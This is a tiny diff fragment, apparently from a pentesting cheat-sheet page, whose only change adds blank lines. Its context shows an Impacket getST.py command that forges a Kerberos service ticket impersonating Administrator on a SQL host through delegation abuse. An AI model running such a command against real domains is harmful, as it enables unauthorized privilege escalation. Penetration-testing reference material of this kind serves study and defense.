@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:26:26.278263+00:00'
 ```bash
 getST.py -spn HOST/SQL01.DOMAIN 'DOMAIN/user:password' -impersonate Administrator -dc-ip 10.10.10.10
 ```
+
+
